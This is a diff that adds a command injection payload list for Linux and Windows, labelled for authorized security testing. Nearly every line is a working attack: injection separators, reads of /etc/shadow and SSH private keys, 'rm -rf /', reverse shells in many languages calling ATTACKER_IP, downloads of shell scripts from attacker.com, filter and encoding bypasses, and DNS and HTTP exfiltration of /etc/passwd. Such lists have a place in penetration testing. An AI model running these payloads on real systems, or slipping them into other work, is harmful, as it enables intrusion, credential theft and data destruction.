@@ -1,0 +1,264 @@
+# OS Command Injection Payloads Collection
+# For authorized security testing only
+
+# ============================================
+# BASIC DETECTION PAYLOADS
+# ============================================
+
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+$(whoami)
+`whoami`
+; id
+| id
+|| id
+& id
+&& id
+$(id)
+`id`
+
+# ============================================
+# LINUX COMMAND INJECTION
+# ============================================
+
+# Basic separators
+; ls -la
+| ls -la
+|| ls -la
+& ls -la
+&& ls -la
+$(ls -la)
+`ls -la`
+
+# Read files
+; cat /etc/passwd
+| cat /etc/passwd
+; cat /etc/shadow
+| cat /etc/shadow
+; cat ~/.ssh/id_rsa
+| cat ~/.ssh/id_rsa
+
+# Reverse shells
+; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+| bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+| python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# File operations
+; touch /tmp/pwned
+| touch /tmp/pwned
+; rm -rf /
+| rm -rf /
+
+# Network operations
+; wget http://attacker.com/shell.sh -O /tmp/shell.sh
+| curl http://attacker.com/shell.sh -o /tmp/shell.sh
+; nc -e /bin/bash ATTACKER_IP PORT
+| nc -e /bin/bash ATTACKER_IP PORT
+
+# Privilege escalation
+; sudo -l
+| sudo -l
+; cat /etc/sudoers
+| cat /etc/sudoers
+
+# ============================================
+# WINDOWS COMMAND INJECTION
+# ============================================
+
+# Basic separators
+& whoami
+&& whoami
+| whoami
+|| whoami
+%0a whoami
+%0d%0a whoami
+
+# Read files
+& type C:\Windows\System32\drivers\etc\hosts
+| type C:\Windows\System32\drivers\etc\hosts
+& type C:\Windows\win.ini
+| type C:\Windows\win.ini
+
+# Reverse shells
+& powershell -e <base64-encoded-reverse-shell>
+| powershell -e <base64-encoded-reverse-shell>
+& powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')
+| powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')
+
+# File operations
+& copy C:\Windows\System32\cmd.exe C:\temp\cmd.exe
+| del /f /q C:\important.txt
+
+# Network operations
+& powershell -c "Invoke-WebRequest http://attacker.com -OutFile C:\temp\shell.exe"
+| certutil -urlcache -split -f http://attacker.com/shell.exe C:\temp\shell.exe
+
+# ============================================
+# ENCODING BYPASS
+# ============================================
+
+# URL encoding
+%3B%20whoami     # ; whoami
+%7C%20whoami     # | whoami
+%26%20whoami     # & whoami
+
+# Double URL encoding
+%253B%2520whoami
+%257C%2520whoami
+%2526%2520whoami
+
+# Base64 encoding
+echo 'bXkgY21k' | base64 -d | bash
+; echo 'd2hvYW1p' | base64 -d | bash
+| echo 'bHMgLWxh' | base64 -d | bash
+
+# Hex encoding
+; echo -e '\x77\x68\x6f\x61\x6d\x69'
+| echo -e '\x77\x68\x6f\x61\x6d\x69'
+
+# Character substitution
+$'\x77\x68\x6f\x61\x6d\x69'  # whoami
+$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'  # cat /etc/passwd
+
+# ============================================
+# FILTER BYPASS TECHNIQUES
+# ============================================
+
+# Space bypass
+${IFS}          # Internal Field Separator
+$IFS%09         # Tab
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+cat%09/etc/passwd
+cat</etc/passwd
+cat<</etc/passwd
+
+# Keyword bypass
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+/bin/ca? /etc/passwd
+/bin/cat /etc/passwd
+cat /etc/pas?wd
+cat /etc/pas*
+cat <<< "test"
+
+# Path bypass
+/bin/cat /etc/passwd
+/usr/bin/cat /etc/passwd
+/bin/ls /
+/usr/bin/id
+
+# Newline injection
+cat%0a/etc/passwd
+cat%0d%0a/etc/passwd
+;cat%0a/etc/passwd
+|cat%0a/etc/passwd
+
+# Double pipe/or bypass
+|| cat /etc/passwd
+&& cat /etc/passwd
+||| cat /etc/passwd
+&&& cat /etc/passwd
+
+# Null byte bypass (older systems)
+cat%00/etc/passwd
+cat /etc/passwd%00
+
+# Wildcard bypass
+/bin/c?t /etc/passwd
+/bin/c* /etc/passwd
+/bin/?a? /etc/passwd
+
+# Variable expansion
+c=a;t=/etc/passwd;cat $t
+a=cat;b=/etc/passwd;$a $b
+c=at;/bin/$c /etc/passwd
+
+# ============================================
+# REVERSE SHELL ONE-LINERS
+# ============================================
+
+# Bash
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT;sh <&196 >&196 2>&196
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Netcat
+nc -e /bin/bash ATTACKER_IP PORT
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
+ncat ATTACKER_IP PORT -e /bin/sh
+
+# PHP
+php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
+
+# Perl
+perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Ruby
+ruby -rsocket -e 'TCPSocket.open("ATTACKER_IP",PORT){|s|exec "/bin/sh -i <&1 >&1 2>&1"}'
+
+# Lua
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+# Go
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
+
+# ============================================
+# OUT-OF-BAND DATA EXFILTRATION
+# ============================================
+
+# DNS exfiltration
+; ping `whoami`.attacker.com
+| nslookup `whoami`.attacker.com
+; cat /etc/passwd | nslookup $(cat /etc/passwd).attacker.com
+
+# HTTP exfiltration
+; curl http://attacker.com/exfil?data=$(cat /etc/passwd)
+| wget -q -O - http://attacker.com/exfil?data=$(cat /etc/passwd)
+
+# FTP exfiltration
+; echo $(cat /etc/passwd) | ftp attacker.com
+
+# ============================================
+# COMMON COMMAND INJECTION BYPASS
+# ============================================
+
+# Blacklisted command bypass
+w'h'oami
+w"h"oami
+w\hoami
+${@}whoami
+who$@ami
+who$*ami
+
+# Space bypass
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+cat</etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+
+# Special characters
+;cat$IFS/etc/passwd
+|cat$IFS/etc/passwd
+$(cat</etc/passwd)
+`cat</etc/passwd`
+
+# Newline injection
+;cat%0a/etc/passwd
+|cat%0a/etc/passwd
+
+# Double pipe/or
+||cat /etc/passwd
+&&cat /etc/passwd
